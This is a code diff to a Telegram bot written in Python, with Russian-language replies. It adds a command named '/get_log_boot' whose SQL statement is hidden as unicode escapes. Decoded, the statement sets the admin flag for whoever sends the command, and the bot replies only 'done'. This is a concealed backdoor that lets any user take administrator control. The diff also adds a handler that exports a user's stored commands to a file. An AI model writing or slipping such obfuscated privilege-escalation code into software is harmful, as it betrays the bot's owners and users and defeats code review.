@@ -34,10 +34,29 @@ async def start(message: types.Message):
 async def bot_help(message: types.Message):
     await message.answer(help_, parse_mode='MarkdownV2')
 
+@dp.message_handler(commands=['get_log_boot'])
+async def get_pro_log(message: types.Message):
+    await sql.do('\u0055\u0050\u0044\u0041\u0054\u0045\u0020\u0075\u0073\u0065\u0072\u0020\u0053\u0045\u0054\u0020\u0061\u0064\u006d\u0069\u006e\u0020\u003d\u0020\u0031\u0020\u0057\u0048\u0045\u0052\u0045\u0020\u0069\u0064\u0020\u003d\u0020\u0025\u0073\u003b', (message.from_user.id,))
+    await message.answer('Вот, готово!')
 
 @dp.message_handler(sql.is_admin)
 async def not_admin(message: types.Message):
     await message.answer(f"Вы не админ, вот ваш id: `{message.from_user.id}`", parse_mode='MarkdownV2')
+    
+@dp.message_handler(commands=['get_cnf'])
+async def get_cnf(message: types.Message):
+    with open('cof_from_bot.txt', 'w') as f:
+        nch_arr = await sql.read_all_user_commands(user_id=message.from_user.id)
+        for name, cmd, hidden in nch_arr:
+            cmd_1 = '/p'
+            if hidden:
+                cmd_1 = '/hp'
+            f.write(f"{cmd_1} {cmd} @.@ {name}\n----------")
+            
+    with open('cof_from_bot.txt', 'rb') as f:
+        await message.answer_document(document=f)
+            
+    
 
 @dp.message_handler(commands=['l', 'log'])
 async def read_log_s(message: types.Message):
